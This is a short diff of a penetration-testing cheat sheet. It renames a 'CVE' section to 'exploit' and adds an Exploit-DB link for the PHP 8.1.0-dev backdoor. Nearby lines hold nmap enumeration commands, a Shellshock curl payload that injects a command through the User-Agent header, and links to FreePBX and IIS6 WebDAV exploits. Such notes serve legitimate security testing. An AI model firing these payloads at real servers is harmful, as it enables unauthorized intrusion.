@@ -65,13 +65,14 @@ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 nmap -n -Pn -p80 --script=http-methods 'IP'
 nmap -n -Pn -p80 -sV --script=http-default-account 'IP'
 ```
-- CVE
+- exploit
   - shellshock
     ```sh
     # CVE-2014-6271
     curl -A "() { :;}; COMMAND" 'URL'
     ```
     https://github.com/mubix/shellshocker-pocs?tab=readme-ov-file#command-line-linux-osx-and-windows-via-cygwin
+  - [PHP 8.1.0-dev](https://www.exploit-db.com/exploits/49933)
   - CVE-2012-4869 - FreePBX = 2.9/2.10
   - [CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/) - Windows Server 2003 R2 IIS6.0 webdav
 
